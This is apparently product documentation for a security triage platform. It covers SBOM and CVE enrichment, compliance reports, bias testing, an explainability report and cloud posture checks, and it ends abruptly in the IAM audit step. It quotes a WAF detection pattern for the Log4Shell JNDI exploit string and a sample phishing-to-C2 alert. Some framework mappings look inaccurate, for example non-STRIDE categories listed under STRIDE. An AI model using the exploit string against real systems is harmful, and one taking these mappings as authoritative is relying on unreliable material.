# JanuSec: Triage-as-a-Service Platform
## Part 3: Complete Feature Walkthrough & User Flows

**Document Version:** 1.0
**Date:** October 28, 2025
**Prerequisites:** Read Part 1 (Positioning) and Part 2 (AI Techniques)

---

## Table of Contents

1. [SBOM + Vulnerability Intelligence (KEV/EPSS/CVSS)](#sbom--vulnerability-intelligence)
2. [Compliance Detection & Monitoring](#compliance-detection--monitoring)
3. [Explainable AI Frameworks](#explainable-ai-frameworks)
4. [Cloud Security Detection & Response (CSPM)](#cloud-security-detection--response)
5. [Complete User Flows by Skill Level](#complete-user-flows-by-skill-level)
6. [Integration Cookbook](#integration-cookbook)

---

## SBOM + Vulnerability Intelligence

### Complete SBOM Workflow with AI Enrichment

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                     SBOM VULNERABILITY TRIAGE WORKFLOW                        │
└──────────────────────────────────────────────────────────────────────────────┘

STEP 1: SBOM UPLOAD
═══════════════════════════════════════════════════════════════════════════════
Input Formats: CycloneDX JSON, SPDX JSON
API: POST /api/v1/sbom/upload

Example SBOM (CycloneDX):
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.4",
  "components": [
    {
      "name": "log4j-core",
      "version": "2.14.1",
      "purl": "pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1",
      "hashes": [{"alg": "SHA-256", "content": "abc123..."}]
    },
    {
      "name": "spring-framework",
      "version": "5.3.10",
      "purl": "pkg:maven/org.springframework/spring-framework@5.3.10"
    }
  ]
}

JanuSec Processing:
├─ Parse SBOM → Extract components (name, version, purl, cpe)
├─ Generate component_key: f"{name}@{version}"
└─ Store: artifacts/sbom/{tenant_id}/{sbom_id}.json

───────────────────────────────────────────────────────────────────────────────

STEP 2: CVE MAPPING
═══════════════════════════════════════════════════════════════════════════════
Query: Match components → Known CVEs

Sources:
├─ NVD (National Vulnerability Database) API
├─ Qualys VMDR (vulnerability aggregates)
├─ Tenable.io (VPR scores)
└─ OSV (Open Source Vulnerabilities)

Example Mapping:
Component: log4j-core@2.14.1
├─ CVE-2021-44228 (Log4Shell)
│  ├─ CVSS: 10.0 (Critical)
│  ├─ Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
│  ├─ Published: 2021-12-10
│  └─ Description: "JNDI lookup RCE vulnerability..."
│
└─ CVE-2021-45046 (Log4Shell bypass)
   ├─ CVSS: 9.0 (Critical)
   └─ Published: 2021-12-14

Storage: repositories.sbom_vuln_agg_repo
Record: {
  tenant_id, component_key, severity_counts: {critical: 2, high: 0, ...},
  cvss_max: 10.0, oldest_vuln_ts: 1639094400
}

───────────────────────────────────────────────────────────────────────────────

STEP 3: KEV ENRICHMENT (CISA Known Exploited Vulnerabilities)
═══════════════════════════════════════════════════════════════════════════════
API: src/integrations/vuln_enrichment.py

KEV Catalog Sync (daily):
├─ Fetch: https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json
├─ Parse: {cveID, dateAdded, knownRansomwareCampaignUse, dueDate}
└─ Store: data/kev_catalog.json

Enrichment Logic:
for cve in sbom_cves:
    if cve in KEV_CATALOG:
        cve['kev'] = True
        cve['kev_date_added'] = KEV_CATALOG[cve]['dateAdded']
        cve['kev_ransomware_use'] = KEV_CATALOG[cve]['knownRansomwareCampaignUse']
        cve['kev_due_date'] = KEV_CATALOG[cve]['dueDate']

Example:
CVE-2021-44228:
├─ KEV: Yes
├─ Date Added: 2021-12-10
├─ Ransomware Use: Yes
└─ Due Date: 2021-12-24 (CISA mandate: patch within 2 weeks)

Factor Emitted: exploit:kev (+0.18 confidence)
MITRE Mapping: T1190 (Exploit Public-Facing Application), T1210 (Lateral Movement)

───────────────────────────────────────────────────────────────────────────────

STEP 4: EPSS ENRICHMENT (Exploit Prediction Scoring System)
═══════════════════════════════════════════════════════════════════════════════
API: https://api.first.org/data/v1/epss

EPSS Score:
├─ 0.0-0.1: Low exploitation probability (10%)
├─ 0.1-0.5: Medium exploitation probability (50%)
├─ 0.5-0.8: High exploitation probability (80%)
└─ 0.8-1.0: Very high exploitation probability (>80%)

Example:
CVE-2021-44228:
├─ EPSS Score: 0.9752 (97.52% probability of exploitation in next 30 days)
├─ EPSS Percentile: 99.8th percentile (top 0.2% of all CVEs)
└─ Model: FIRST EPSS v3.0 (ML-based prediction)

Calculation:
EPSS uses machine learning to predict exploitation based on:
├─ CVE metadata (CVSS, CWE, NVD description)
├─ Exploit availability (Exploit-DB, Metasploit, GitHub)
├─ Threat intel (Twitter mentions, security blogs)
├─ Historical exploitation (observed in honeypots)
└─ Time since disclosure (decay factor)

Factor Decision:
if epss_score >= 0.8 and cvss >= 7.0:
    factors.append('vuln:epss_high_exploit_risk')
    confidence_delta += 0.12

───────────────────────────────────────────────────────────────────────────────

STEP 5: QUALYS/TENABLE ENRICHMENT
═══════════════════════════════════════════════════════════════════════════════
Integrations:
├─ Qualys VMDR: QID, severity, patch availability
└─ Tenable.io: VPR (Vulnerability Priority Rating)

Qualys Enrichment (src/integrations/qualys_client.py):
CVE-2021-44228:
├─ QID: 376237
├─ Severity: 5 (Critical)
├─ CVSS v3: 10.0
├─ Patch Available: Yes (Log4j 2.17.0+)
└─ Exploit Available: Yes (public PoC)

Tenable VPR Enrichment:
VPR Score: 9.8/10
├─ Product Coverage: 95th percentile (widespread usage)
├─ Threat Intelligence: 99th percentile (active exploitation)
├─ Age of Vulnerability: 30 days
└─ CVSS v3: 10.0

VPR Formula (Tenable proprietary):
VPR = f(CVSS, ProductCoverage, ThreatIntel, Age)
Weight: CVSS (40%), ThreatIntel (30%), ProductCoverage (20%), Age (10%)

───────────────────────────────────────────────────────────────────────────────

STEP 6: SBOM FACTOR GENERATION
═══════════════════════════════════════════════════════════════════════════════
Code: src/modules/sbom_vuln_mapper.py

Factor Rules:
1. sbom:cve_critical: If critical_count > 0 → +0.08
2. sbom:cve_high_density: If (high + critical) ≥ 3 → +0.05
3. sbom:cve_backlog_large: If total ≥ 25 → +0.03
4. sbom:vuln_age_stale: If oldest_vuln > 180 days → +0.02
5. sbom:supply_chain_drift: If component hash changed → +0.04
6. vuln:cvss_ge_9: If cvss_max ≥ 9.0 → +0.03

Confidence Aggregation:
├─ Sum all positive deltas
├─ Cap at 0.20 (prevents SBOM-only over-scoring)
└─ Scale if exceeds cap: scale = 0.20 / sum(deltas)

Example:
Component: log4j-core@2.14.1
├─ critical_count: 2 → sbom:cve_critical (+0.08)
├─ high + critical: 2 ≥ 3? No
├─ total: 2 < 25? Yes
├─ age: 1095 days > 180? Yes → sbom:vuln_age_stale (+0.02)
├─ hash drift: No
├─ cvss_max: 10.0 ≥ 9.0? Yes → vuln:cvss_ge_9 (+0.03)
└─ Total delta: 0.08 + 0.02 + 0.03 = 0.13 (< 0.20, no scaling)

Factors: ['sbom:cve_critical', 'sbom:vuln_age_stale', 'vuln:cvss_ge_9']
Confidence: +0.13
Risk Score: 8.7/10

───────────────────────────────────────────────────────────────────────────────

STEP 7: TRIAGE REPORT GENERATION
═══════════════════════════════════════════════════════════════════════════════
API: GET /api/v1/sbom/vulns?sbom_id=12345

Response:
{
  "sbom_id": "12345",
  "component": "log4j-core@2.14.1",
  "verdict": "CRITICAL",
  "risk_score": 8.7,

  "vulnerabilities": [
    {
      "cve_id": "CVE-2021-44228",
      "cvss": 10.0,
      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
      "severity": "CRITICAL",
      "published": "2021-12-10",
      "description": "Apache Log4j2 JNDI features do not protect against...",

      "kev": {
        "listed": true,
        "date_added": "2021-12-10",
        "ransomware_use": true,
        "due_date": "2021-12-24"
      },

      "epss": {
        "score": 0.9752,
        "percentile": 99.8,
        "interpretation": "97.5% probability of exploitation in next 30 days"
      },

      "qualys": {
        "qid": 376237,
        "severity": 5,
        "patch_available": true
      },

      "tenable": {
        "vpr": 9.8,
        "product_coverage": "95th percentile",
        "threat_intel": "99th percentile"
      }
    }
  ],

  "factors": [
    "sbom:cve_critical",
    "sbom:vuln_age_stale",
    "vuln:cvss_ge_9",
    "exploit:kev"
  ],

  "mitre": ["T1190", "T1210"],
  "stride": ["Elevation", "Initial Access"],
  "dread": {
    "damage": 5,
    "reproducibility": 5,
    "exploitability": 5,
    "affected_users": 5,
    "discoverability": 5,
    "risk_score": 10.0
  },

  "recommended_actions": [
    "IMMEDIATE: Upgrade log4j-core to version 2.17.1+ (removes JNDI lookup)",
    "URGENT: Identify all hosts using log4j-core@2.14.1 (SBOM inventory)",
    "HIGH: Block outbound LDAP/RMI traffic at firewall (mitigate exfiltration)",
    "MEDIUM: Review application logs for JNDI lookup attempts (IoCs)",
    "LOW: Deploy WAF rules to block ${jndi:ldap://...} patterns"
  ],

  "patch_priority": 1,  # Highest priority (KEV + CVSS 10.0 + EPSS 97%)
  "affected_hosts": 23,  # From SBOM asset inventory
  "estimated_patch_time": "4 hours"
}
```

### VEX (Vulnerability Exploitability eXchange) Support

**Purpose:** Mark vulnerabilities as "not exploitable" in specific contexts

```python
# File: src/api/sbom_endpoints.py

@router.post('/api/v1/sbom/vex')
async def submit_vex(body: dict):
    """Submit VEX statement (manual override)"""

    sbom_id = body['sbom_id']
    statements = body['statements']  # List of VEX statements

    # Example VEX statement:
    # {
    #   "cve_id": "CVE-2021-44228",
    #   "status": "not_affected",
    #   "justification": "vulnerable_code_not_in_execute_path",
    #   "comment": "Log4j used only for configuration parsing, JNDI disabled"
    # }

    for stmt in statements:
        cve_id = stmt['cve_id']
        status = stmt['status']  # not_affected, affected, fixed, under_investigation

        if status == 'not_affected':
            # Remove CVE from vulnerability list
            remove_cve_from_sbom(sbom_id, cve_id)

            # Audit trail
            audit_log(f"VEX: {cve_id} marked as not_affected for {sbom_id}")

    return {'status': 'ok', 'vex_statements': len(statements)}
```

**Use Case:**
```
Scenario: Log4j vulnerability, but JNDI lookup disabled in configuration

Without VEX:
├─ SBOM reports: CVE-2021-44228 (CRITICAL, CVSS 10.0)
├─ SOC escalates: Patch immediately
└─ Dev team: "Not exploitable, JNDI disabled"

With VEX:
├─ Dev submits VEX statement: "not_affected, vulnerable_code_not_in_execute_path"
├─ JanuSec removes CVE from active alerts
├─ Audit trail preserved for compliance
└─ SOC focuses on genuinely exploitable vulnerabilities
```

---

## Compliance Detection & Monitoring

### EU AI Act Compliance (Articles 9-10)

#### Article 9: Risk Management System

```python
# File: src/core/ai_governance/eu_ai_act_compliance.py

@dataclass
class AIRiskAssessment:
    """EU AI Act Article 9: Risk Management System"""

    risk_id: str
    risk_name: str
    risk_level: RiskLevel  # UNACCEPTABLE, HIGH, LIMITED, MINIMAL

    # Risk Analysis (Likelihood × Impact)
    likelihood: str  # very_low, low, medium, high, very_high
    impact: str      # negligible, minor, moderate, major, severe

    # Affected Groups
    affected_groups: List[str]  # e.g., ["SOC analysts", "Security executives"]

    # Mitigation Measures
    mitigation_measures: List[str]
    residual_risk_level: Optional[RiskLevel]

    # Metadata
    assessed_by: str
    assessed_date: str
    next_review_date: str
    status: str  # open, mitigated, accepted

# Example Risk Assessment
risk = AIRiskAssessment(
    risk_id="AI-RISK-001",
    risk_name="False Positive Overload",
    risk_level=RiskLevel.HIGH,

    likelihood="high",
    impact="major",

    affected_groups=["SOC analysts", "L1 responders"],

    mitigation_measures=[
        "Implement 4-tier AI with graceful degradation",
        "Continuous learning from analyst feedback",
        "Human-in-loop for confidence < 0.85",
        "Explainability (MITRE/CVSS/STRIDE) for all verdicts"
    ],

    residual_risk_level=RiskLevel.LIMITED,

    assessed_by="security_lead@company.com",
    assessed_date="2025-10-15",
    next_review_date="2026-01-15",
    status="mitigated"
)

# API Endpoint
@router.get('/api/v1/compliance/eu-ai-act/article-9')
async def article_9_report(tenant_id: str = Depends(get_tenant)):
    """Generate Article 9 compliance report"""

    # Load all risk assessments
    risks = load_risk_assessments(tenant_id)

    # Aggregate by level
    by_level = {
        'unacceptable': [r for r in risks if r.risk_level == RiskLevel.UNACCEPTABLE],
        'high': [r for r in risks if r.risk_level == RiskLevel.HIGH],
        'limited': [r for r in risks if r.risk_level == RiskLevel.LIMITED],
        'minimal': [r for r in risks if r.risk_level == RiskLevel.MINIMAL]
    }

    # Compliance status
    compliance = {
        'total_risks': len(risks),
        'unacceptable_count': len(by_level['unacceptable']),
        'high_risks_mitigated': sum(1 for r in by_level['high'] if r.status == 'mitigated'),
        'high_risks_open': sum(1 for r in by_level['high'] if r.status == 'open'),
        'compliance_score': calculate_compliance_score(risks),
        'audit_ready': all(r.status in ['mitigated', 'accepted'] for r in by_level['high'])
    }

    return {
        'article': 'Article 9 - Risk Management System',
        'risks': risks,
        'by_level': by_level,
        'compliance': compliance
    }
```

#### Article 10: Data Governance

```python
# File: src/core/ai_governance/dataset_governance.py

@dataclass
class DatasetCard:
    """EU AI Act Article 10: Data and Data Governance"""

    dataset_id: str
    dataset_name: str
    version: str

    # Provenance
    data_sources: List[str]
    collection_method: str
    collection_date: str

    # Quality
    size_records: int
    completeness_score: float  # 0.0-1.0
    accuracy_score: float      # 0.0-1.0

    # Bias Testing
    bias_testing_performed: bool
    bias_metrics: Dict[str, float]  # {DIR: 0.82, EOD: 0.15}

    # Integrity
    checksum_sha256: str
    pgp_signature: Optional[str]

    # Compliance
    gdpr_compliant: bool
    pii_redacted: bool

    # Lineage
    upstream_datasets: List[str]
    transformations_applied: List[str]

# Example Dataset Card
dataset_card = DatasetCard(
    dataset_id="training-2025-10",
    dataset_name="SOC Analyst Feedback Corpus",
    version="1.0.0",

    data_sources=["Analyst feedback portal", "SIEM alert triage logs"],
    collection_method="Automated export (nightly)",
    collection_date="2025-10-01 to 2025-10-31",

    size_records=125000,
    completeness_score=0.97,  # 97% of fields populated
    accuracy_score=0.94,       # 94% validated against ground truth

    bias_testing_performed=True,
    bias_metrics={
        'disparate_impact_ratio': 0.85,  # 0.8-1.0 = fair
        'equal_opportunity_diff': 0.12   # <0.15 = fair
    },

    checksum_sha256='a3f8b2c1...',
    pgp_signature='-----BEGIN PGP SIGNATURE-----...',

    gdpr_compliant=True,
    pii_redacted=True,

    upstream_datasets=['raw_siem_logs_2025_10', 'analyst_feedback_2025_10'],
    transformations_applied=[
        'PII redaction (Presidio)',
        'Deduplication (hash-based)',
        'Normalization (schema v2.1)',
        'Train/test split (80/20)'
    ]
)

# API Endpoint
@router.get('/api/v1/compliance/eu-ai-act/article-10')
async def article_10_report(tenant_id: str = Depends(get_tenant)):
    """Generate Article 10 compliance report"""

    # Load all dataset cards
    datasets = load_dataset_cards(tenant_id)

    # Compliance checks
    compliance = {
        'total_datasets': len(datasets),
        'gdpr_compliant': sum(1 for d in datasets if d.gdpr_compliant),
        'bias_tested': sum(1 for d in datasets if d.bias_testing_performed),
        'high_quality': sum(1 for d in datasets if d.completeness_score >= 0.95 and d.accuracy_score >= 0.90),
        'audit_ready': all(d.checksum_sha256 and d.gdpr_compliant for d in datasets)
    }

    return {
        'article': 'Article 10 - Data and Data Governance',
        'datasets': datasets,
        'compliance': compliance
    }
```

#### Bias Testing (Algorithmic Fairness)

```python
# File: src/core/ai_governance/bias_testing.py

def compute_bias_metrics(decisions: List[dict], group_attr: str) -> dict:
    """Compute bias metrics: DIR and EOD"""

    # Group decisions by protected attribute
    groups = {}
    for d in decisions:
        group_val = d.get(group_attr, 'unknown')

        if group_val not in groups:
            groups[group_val] = {'total': 0, 'positive': 0}

        groups[group_val]['total'] += 1

        verdict = d.get('verdict', 'suspicious')
        if verdict == 'malicious':
            groups[group_val]['positive'] += 1

    # Calculate positive rates
    for g in groups.values():
        g['positive_rate'] = g['positive'] / max(1, g['total'])

    # Disparate Impact Ratio (DIR): min_rate / max_rate
    rates = [g['positive_rate'] for g in groups.values()]
    dir_ratio = min(rates) / max(max(rates), 0.01) if rates else 1.0

    # Equal Opportunity Difference (EOD): max_diff in positive rates
    eod = max(rates) - min(rates) if rates else 0.0

    # Fairness thresholds (4/5 rule)
    dir_fair = dir_ratio >= 0.8  # DIR ≥ 0.8 = fair
    eod_fair = eod <= 0.15        # EOD ≤ 0.15 = fair

    return {
        'groups': groups,
        'disparate_impact_ratio': dir_ratio,
        'equal_opportunity_diff': eod,
        'dir_fair': dir_fair,
        'eod_fair': eod_fair,
        'overall_fair': dir_fair and eod_fair
    }

# API Endpoint with Time Windows
@router.get('/api/v1/compliance/bias/report')
async def bias_report(
    attr: str = Query('tenant_id'),  # Group by tenant, user, host, etc.
    window_seconds: int = Query(86400),  # 24 hours default
    include_suspicious: bool = Query(False)
):
    """Generate bias testing report with time window"""

    cutoff = time.time() - window_seconds

    # Load decisions from time window
    decisions = load_decisions_since(cutoff)

    # Compute bias metrics
    bias = compute_bias_metrics(decisions, group_attr=attr)

    return {
        'attr': attr,
        'window_seconds': window_seconds,
        'decision_count': len(decisions),
        'bias_metrics': bias,
        'recommendation': 'PASS' if bias['overall_fair'] else 'REVIEW REQUIRED'
    }
```

**Real-World Example:**
```
Bias Testing: Alert verdicts by tenant

Time Window: Last 7 days
Group Attribute: tenant_id

Results:
┌──────────────┬───────┬──────────┬───────────────┐
│ Tenant       │ Total │ Malicious│ Positive Rate │
├──────────────┼───────┼──────────┼───────────────┤
│ tenant_a     │ 1000  │ 120      │ 0.12 (12%)    │
│ tenant_b     │ 800   │ 88       │ 0.11 (11%)    │
│ tenant_c     │ 1200  │ 132      │ 0.11 (11%)    │
└──────────────┴───────┴──────────┴───────────────┘

Disparate Impact Ratio (DIR):
min(0.11, 0.11, 0.12) / max(0.11, 0.11, 0.12) = 0.11 / 0.12 = 0.917
DIR = 0.917 ≥ 0.8 → PASS (no bias)

Equal Opportunity Difference (EOD):
max(0.11, 0.11, 0.12) - min(0.11, 0.11, 0.12) = 0.12 - 0.11 = 0.01
EOD = 0.01 ≤ 0.15 → PASS (no bias)

Verdict: FAIR (no algorithmic bias detected across tenants)
```

---

## Explainable AI Frameworks

### Multi-Framework Threat Modeling

JanuSec provides **7 complementary explainability frameworks** to ensure analysts understand WHY an alert was triaged a certain way:

```
┌──────────────────────────────────────────────────────────────────────────────┐
│          EXPLAINABLE AI: 7 FRAMEWORKS FOR THREAT UNDERSTANDING                │
└──────────────────────────────────────────────────────────────────────────────┘

1. CVE (Common Vulnerabilities and Exposures)
   ├─ Purpose: Link alerts to specific known vulnerabilities
   ├─ Example: CVE-2021-44228 (Log4Shell)
   └─ Source: NVD, Qualys, Tenable

2. CVSS (Common Vulnerability Scoring System)
   ├─ Purpose: Severity scoring (0.0-10.0)
   ├─ Components: Attack Vector, Complexity, Privileges, User Interaction, Scope, CIA
   └─ Example: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H = 10.0

3. MITRE ATT&CK (Adversarial Tactics, Techniques & Common Knowledge)
   ├─ Purpose: Map alerts to attack techniques
   ├─ Example: T1059.001 (PowerShell execution), T1071.001 (Web protocols)
   └─ Source: Factor → Technique mapping (technique_mapping.py)

4. STRIDE (Threat Categorization)
   ├─ Purpose: Classify threat type
   ├─ Categories: Spoofing, Tampering, Repudiation, Information Disclosure, Denial, Elevation
   └─ Example: "Elevation + Information Disclosure"

5. DREAD (Risk Scoring)
   ├─ Purpose: Quantify risk on 1-5 scale
   ├─ Components: Damage, Reproducibility, Exploitability, Affected Users, Discoverability
   └─ Example: D=5, R=5, E=5, A=5, D=5 → Risk = 10.0/10

6. PASTA (Process for Attack Simulation and Threat Analysis)
   ├─ Purpose: 7-stage attack modeling
   ├─ Stages: Define Objectives → Define Technical Scope → Decompose Application →
   │           Identify Threats → Identify Vulnerabilities → Enumerate Attacks → Risk/Impact
   └─ Example: Stage 6 (Attack Enumeration) → "JNDI lookup RCE"

7. MAESTRO (Kill Chain Phases)
   ├─ Purpose: Map alert to attack phase
   ├─ Phases: Recon → Initial Access → Execution → Persistence → Privilege Escalation →
   │          Defense Evasion → Discovery → Lateral Movement → Collection → Exfiltration → C2 → Impact
   └─ Example: "Initial Access (T1190) → Execution (T1059.001) → C2 (T1071.001)"
```

### Complete Explainability Report Example

```json
{
  "alert_id": "evt_12345",
  "artifact_id": "art_67890",
  "verdict": "MALICIOUS",
  "confidence": 0.92,
  "risk_score": 8.7,

  "timeline": {
    "detected_at": "2025-10-28T10:05:00Z",
    "triage_completed_at": "2025-10-28T10:05:00.205Z",
    "latency_ms": 205
  },

  "factors": {
    "detected": [
      "rare_lineage",
      "lolbin:powershell_encoded",
      "net:beacon_like",
      "domain_novel_observed",
      "ssl:ja3_known_bad",
      "corr:vuln_host_beacon"
    ],

    "contributions": {
      "rare_lineage": {"weight": 0.12, "quality": 0.95},
      "lolbin:powershell_encoded": {"weight": 0.08, "quality": 0.98},
      "net:beacon_like": {"weight": 0.15, "quality": 0.92},
      "domain_novel_observed": {"weight": 0.06, "quality": 0.88},
      "ssl:ja3_known_bad": {"weight": 0.18, "quality": 0.99},
      "corr:vuln_host_beacon": {"weight": 0.22, "quality": 0.96}
    },

    "total_weight": 0.81,
    "llm_refinement": {"enabled": true, "risk_delta": 0.11}
  },

  "cve": [
    {
      "cve_id": "CVE-2024-1234",
      "cvss": 9.8,
      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "description": "Remote code execution via buffer overflow",
      "published": "2024-10-15",
      "kev": true,
      "epss": 0.87
    }
  ],

  "cvss": {
    "score": 9.8,
    "severity": "CRITICAL",
    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "breakdown": {
      "attack_vector": "Network (AV:N)",
      "attack_complexity": "Low (AC:L)",
      "privileges_required": "None (PR:N)",
      "user_interaction": "None (UI:N)",
      "scope": "Unchanged (S:U)",
      "confidentiality": "High (C:H)",
      "integrity": "High (I:H)",
      "availability": "High (A:H)"
    }
  },

  "mitre": {
    "tactics": ["Initial Access", "Execution", "Command and Control"],
    "techniques": [
      {
        "id": "T1190",
        "name": "Exploit Public-Facing Application",
        "tactic": "Initial Access",
        "factors": ["corr:vuln_host_beacon"]
      },
      {
        "id": "T1059.001",
        "name": "PowerShell",
        "tactic": "Execution",
        "factors": ["lolbin:powershell_encoded"]
      },
      {
        "id": "T1071.001",
        "name": "Application Layer Protocol: Web Protocols",
        "tactic": "Command and Control",
        "factors": ["net:beacon_like"]
      },
      {
        "id": "T1573",
        "name": "Encrypted Channel",
        "tactic": "Command and Control",
        "factors": ["ssl:ja3_known_bad"]
      }
    ]
  },

  "stride": {
    "categories": ["Elevation", "Information Disclosure", "Command and Control"],
    "explanation": {
      "Elevation": "Rare lineage (outlook → powershell) suggests privilege escalation",
      "Information Disclosure": "Beaconing and SSL abuse indicate data exfiltration",
      "Command and Control": "Known-bad JA3 fingerprint matches Cobalt Strike"
    }
  },

  "dread": {
    "components": {
      "damage": 5,
      "reproducibility": 4,
      "exploitability": 4,
      "affected_users": 3,
      "discoverability": 2
    },
    "risk_score": 7.2,
    "normalized_risk": 8.0,
    "interpretation": "HIGH risk (widespread impact, easily exploitable)"
  },

  "pasta": {
    "stage": "Stage 6: Attack Enumeration",
    "attack_scenario": "Phishing email with malicious macro → PowerShell C2 beacon → Data exfiltration",
    "threat_tree": [
      "1. Phishing email delivered (T1566.001)",
      "2. User opens attachment, macro executes (T1204.002)",
      "3. Outlook spawns PowerShell (rare lineage)",
      "4. PowerShell establishes C2 beacon (net:beacon_like)",
      "5. Data exfiltration via HTTPS (ssl:ja3_known_bad)"
    ]
  },

  "maestro": {
    "kill_chain_phase": "Command and Control",
    "attack_path": [
      {"phase": "Initial Access", "technique": "T1190", "timestamp": "2025-10-28T10:00:00Z"},
      {"phase": "Execution", "technique": "T1059.001", "timestamp": "2025-10-28T10:05:00Z"},
      {"phase": "Command and Control", "technique": "T1071.001", "timestamp": "2025-10-28T10:05:30Z"}
    ],
    "current_phase": "Command and Control",
    "next_phases": ["Collection", "Exfiltration"]
  },

  "hopgraph_provenance": {
    "path": [
      {"node": "workstation-42", "type": "host"},
      {"node": "powershell.exe", "type": "process"},
      {"node": "evil.com", "type": "domain"},
      {"node": "192.0.2.100", "type": "ip"}
    ],

    "edges": [
      {"src": "workstation-42", "dst": "powershell.exe", "type": "spawned", "source": "event", "weight": 1.0},
      {"src": "powershell.exe", "dst": "evil.com", "type": "connected", "source": "sensor", "weight": 1.05},
      {"src": "evil.com", "dst": "192.0.2.100", "type": "resolved", "source": "intel_feed", "weight": 1.2}
    ],

    "scores": [1.0, 1.05, 1.2],
    "age_decay": 0.87,
    "path_score": 8.7
  },

  "narrative": "Outlook spawned encoded PowerShell with C2 beaconing behavior to newly observed domain evil.com. SSL fingerprint matches known Cobalt Strike profile. Host has unpatched CVE-2024-1234 (CVSS 9.8, KEV). Likely initial access via phishing email with malicious macro, followed by C2 establishment for data exfiltration.",

  "recommended_actions": {
    "l1": ["ESCALATE IMMEDIATELY to L2 analyst (high-confidence malware)"],

    "l2": [
      "1. Isolate workstation-42 from network (HIGH priority)",
      "2. Dump process memory (powershell.exe PID 1234)",
      "3. Check for lateral movement from 192.168.1.100 in last 24h",
      "4. Block evil.com at firewall",
      "5. Review all hosts with CVE-2024-1234 (12 hosts in inventory)"
    ],

    "l3": [
      "1. Reverse-engineer PowerShell payload (memory dump analysis)",
      "2. IOC extraction: evil.com, 192.0.2.100, JA3 hash",
      "3. Threat intel submission: evil.com to abuse.ch, VirusTotal",
      "4. SIEM query: Pre-infection activity (email delivery, macro execution)",
      "5. Patch CVE-2024-1234 across all 12 vulnerable hosts",
      "6. User training: Phishing awareness (prevent recurrence)"
    ]
  },

  "confidence_bounds": {
    "point_estimate": 0.92,
    "lower_bound": 0.88,
    "upper_bound": 0.96,
    "uncertainty": 0.04,
    "confidence_level": "1-sigma (68%)"
  },

  "model_attribution": {
    "tier_1_rules": true,
    "tier_2_local_ml": true,
    "tier_3_llm": true,
    "tier_4_specialized": false,
    "total_latency_ms": 205,
    "cost_usd": 0.0004
  },

  "warnings": [
    "Confidence uncertainty: ±4%",
    "Recommendation is decision-support, not formal attestation",
    "Human review recommended for critical actions"
  ]
}
```

---

## Cloud Security Detection & Response (CSPM)

### Complete CSPM Workflow

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              CLOUD SECURITY POSTURE MANAGEMENT (CSPM) WORKFLOW                │
└──────────────────────────────────────────────────────────────────────────────┘

STEP 1: CLOUD DATA INGESTION
═══════════════════════════════════════════════════════════════════════════════
Sources:
├─ AWS: Config, Security Hub, GuardDuty, CloudTrail, Inspector
├─ Azure: Defender for Cloud, Activity Logs, Security Center
├─ GCP: Security Command Center, Cloud Audit Logs, Asset Inventory
└─ OCI: Cloud Guard, Audit Logs, Vulnerability Scanning

Adapters (scheduled polling):
├─ scripts/aws_config_to_posture.py (every 3600s)
├─ scripts/azure_defender_to_posture.py (every 3600s)
├─ scripts/gcp_scc_to_posture.py (every 3600s)
└─ scripts/oci_cloud_guard_to_posture.py (every 3600s)

Example AWS Config Finding:
{
  "awsAccountId": "123456789012",
  "resourceType": "AWS::S3::Bucket",
  "resourceId": "my-data-bucket",
  "complianceType": "NON_COMPLIANT",
  "configRuleName": "s3-bucket-public-read-prohibited",
  "description": "S3 bucket allows public read access"
}

JanuSec Normalization:
{
  "tenant_id": "acme_corp",
  "timestamp": 1730123456,
  "finding_type": "cloud:public_bucket",
  "resource": "s3://my-data-bucket",
  "severity": "high",
  "cloud": "aws",
  "service": "s3",
  "region": "us-east-1"
}

───────────────────────────────────────────────────────────────────────────────

STEP 2: POSTURE ANALYSIS
═══════════════════════════════════════════════════════════════════════════════
API: POST /api/v1/compliance/posture

Factor Generation:
├─ cloud:public_bucket → S3 bucket with public access
├─ cloud:sg_open_0_0_0_0 → Security group open to 0.0.0.0/0
├─ iam:overpriv_wildcard → IAM policy with wildcard actions
├─ iam:key_no_mfa → Access key without MFA
├─ k8s:anonymous_access → Kubernetes API allows anonymous
└─ k8s:privileged_pod → Pod running with privileged flag

Risk Scoring:
severity_weights = {'critical': 3.0, 'high': 2.0, 'medium': 1.0, 'low': 0.5}
risk_score = sum(severity_weights[finding.severity] for finding in findings)

Example:
Findings:
├─ cloud:public_bucket (high) → 2.0
├─ cloud:sg_open_0_0_0_0 (critical) → 3.0
└─ iam:key_no_mfa (medium) → 1.0
Total Risk Score: 6.0/10

───────────────────────────────────────────────────────────────────────────────

STEP 3: COMPLIANCE MAPPING
═══════════════════════════════════════════════════════════════════════════════
Frameworks: ISO27001, PCI-DSS, SOC 2

Heuristic Mapping:
Finding: cloud:public_bucket
├─ ISO27001: A.12.4.1 (Event logging), A.12.6.2 (Restrictions on software)
├─ PCI-DSS: 10.2 (Audit logs), 10.3 (Audit trail)
└─ SOC 2: CC6.6 (Logical access), CC7.2 (System monitoring)

Finding: cloud:sg_open_0_0_0_0
├─ ISO27001: A.13.1.1 (Network controls)
├─ PCI-DSS: 1.2 (Firewall configuration)
└─ SOC 2: CC6.6 (Logical access)

Completeness Score:
observed_controls = {'A.12.4.1', 'A.13.1.1', '10.2', 'CC6.6'}
framework_controls = {'ISO27001': ['A.12.4.1', 'A.12.6.2', 'A.8.7'], ...}

completeness = len(observed_controls ∩ framework_controls) / len(framework_controls)

Example:
ISO27001: 2/3 controls covered = 67%
PCI-DSS: 1/3 controls covered = 33%
SOC 2: 2/3 controls covered = 67%

───────────────────────────────────────────────────────────────────────────────

STEP 4: IAM RISK ANALYSIS
═══════════════════════════════════════════════════════════════════════════════
API: POST /api/v1/compliance/iam/audit

Audit Input:
{
  "users": [
    {"name": "admin@company.com", "mfa_enabled": false, "roles": ["admin"]},
    {"name": "analyst@company.com", "mfa_enabled": true, "roles": ["viewer"]}
  ],
  "keys": [
    {"id": "AKIA...", "user": "admin", "last_used": "2025-08-01", "mfa": false},
